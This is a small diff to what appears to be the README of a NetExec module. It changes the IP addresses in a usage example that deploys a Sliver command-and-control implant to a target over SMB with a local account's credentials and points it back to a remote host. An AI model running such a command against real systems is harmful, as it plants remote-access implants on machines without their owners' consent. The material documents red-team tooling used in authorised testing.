@@ -33,9 +33,9 @@ For detailed installation instructions, see [Installation Guide](docs/INSTALLATI
 Deploy a Sliver implant via SMB:
 
 ```bash
-nxc smb 10.2.10.10 -u localuser -p password \
+nxc smb 172.16.15.20 -u localuser -p password \
   -M sliver_exec \
-  -o RHOST=192.168.1.100
+  -o RHOST=10.10.15.193
 ```
 
 ![](./assets/example.svg)
